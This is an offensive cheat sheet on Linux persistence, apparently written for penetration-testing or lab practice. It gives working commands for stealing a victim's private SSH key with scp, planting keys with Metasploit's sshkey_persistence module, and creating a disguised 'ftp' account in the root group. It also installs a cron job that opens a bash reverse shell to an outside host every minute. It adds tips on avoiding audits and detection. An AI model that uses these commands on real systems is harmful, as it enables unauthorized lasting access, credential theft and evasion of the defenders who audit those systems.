# Linux Persistence via SSH Keys & Cron Jobs â€“ Clear & Complete

## ðŸ”‘ How SSH Key Authentication Works

### The Key Pair
- **Private key** (`id_rsa`):  
  - **Kept secret** on the **client** (your Kali machine)  
  - **Never shared** â€” used to *prove identity* during login  
- **Public key** (`id_rsa.pub`):  
  - Copied to the **server** â†’ stored in `~/.ssh/authorized_keys`  
  - Acts as a "lock" that only your private key can open  

> âœ… **You only need the private key to log in** â€” the public key is already on the server.

---
## ðŸŽ¯ Method: Steal Existing User's SSH Keys

### On Victim (as compromised user)
```bash
ls -la ~/.ssh/
```
âœ… Typical files:
- `id_rsa` â†’ **private key** (what you want)  
- `authorized_keys` â†’ **public keys allowed to log in** (not needed for your attack)

### Steal the Private Key
```bash
# From your Kali machine
scp victim@192.168.1.10:/home/victim/.ssh/id_rsa .
chmod 400 id_rsa  # SSH requires strict permissions
```

### Log In Permanently
```bash
ssh -i id_rsa victim@192.168.1.10
```
âœ… **Works even if password changes** â€” SSH key auth bypasses passwords entirely.

> âš ï¸ **Critical**:  
> - Only works if `victim` has **SSH key-based auth enabled**  
> - If `id_rsa` is **password-protected**, youâ€™ll need the passphrase (rare in servers)

---
## ðŸ› ï¸ Method: Add Your Own SSH Key (Metasploit)

### Use `sshkey_persistence` Module
```msf
use post/linux/manage/sshkey_persistence
set SESSION 1
set CREATESSHFOLDER true
exploit
```

âœ… What it does:
1. Generates a **new key pair** (your private + public key)  
2. Appends public key to victimâ€™s `~/.ssh/authorized_keys`  
3. Saves **private key** to your loot directory  

### Retrieve & Use
```bash
loot  # Find path to private key
chmod 600 /root/.msf4/loot/.../ssh_key
ssh -i ssh_key root@192.168.1.10
```

> ðŸ’¡ **Why this is stealthy**:  
> - No new user created  
> - No password changes  
> - Just an extra line in a hidden file (`~/.ssh/authorized_keys`)

---
## ðŸ‘¤ Method: Create a New User (Less Stealthy)

### Manual Steps (as root)
```bash
useradd -m ftp -s /bin/bash    # Blends in with system accounts
passwd ftp                     # Set password
usermod -aG root ftp           # Grant admin rights
```

> âŒ **Why itâ€™s risky**:  
> - Shows in `/etc/passwd`  
> - Visible in `getent passwd`  
> - Easy to spot during audits

---
## â±ï¸ Method: Cron Job Persistence (Reverse Shell)

### Step 1: Check Existing Cron Jobs
```bash
cat /etc/crontab
ls -la /etc/cron.d/
crontab -l          # Current user's cron jobs
```

### Step 2: Create Malicious Cron Entry
```bash
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.100.8/1234 0>&1'" > /tmp/cron
```
> â“ **What this means**:  
> - `* * * * *` = run **every minute**  
> - `/bin/bash -c '...'` = execute reverse shell command  
> - `>& /dev/tcp/<KALI_IP>/1234` = connect back to your listener  
> - `0>&1` = redirect stdin/stdout/stderr to the socket

### Step 3: Install Cron Job
```bash
crontab /tmp/cron   # Installs the job for current user
crontab -l          # Verify it's added
```
> âš ï¸ **Note**:  
> - Runs with **current user's privileges** (not root unless you're root)  
> - No `-i` flag â€” `crontab <file>` replaces entire crontab

### Step 4: Start Listener on Kali
```bash
nc -nvlp 1234
```
âœ… Every minute, you get a reverse shell as the compromised user.

> ðŸ’¡ **Stealth tip**:  
> Use less frequent intervals (e.g., `*/5 * * * *` = every 5 mins) to reduce noise.

---
## ðŸ“‹ Persistence Method Comparison

| Method | Stealth | Reliability | Detection Risk |
|--------|---------|-------------|----------------|
| **Steal existing SSH key** | â˜…â˜…â˜…â˜…â˜… | High (if key exists) | Very Low |
| **Add your SSH key** | â˜…â˜…â˜…â˜…â˜† | High | Low (hidden file) |
| **Cron job reverse shell** | â˜…â˜…â˜…â˜†â˜† | Medium (survives reboots) | Medium (logs, frequent connections) |
| **Create new user** | â˜…â˜…â˜†â˜†â˜† | Medium | High (`/etc/passwd`) |

---
## ðŸ’¡ Pro Tips

- **Always check `~/.ssh/` first** â€” existing keys = instant persistence  
- **SSH keys > passwords** â€” immune to password rotation  
- **Use `chmod 400/600`** â€” SSH refuses keys with loose permissions  
- **For root access**: Target `/root/.ssh/id_rsa` if you have root privileges  
- **Cron jobs**: Use `*/10 * * * *` to reduce detection risk

> ðŸ”¥ **Golden Rule**:  
> **SSH key persistence is the #1 stealth method on Linux.**  
> Cron jobs are reliable but noisy â€” use only when SSH isnâ€™t an option.

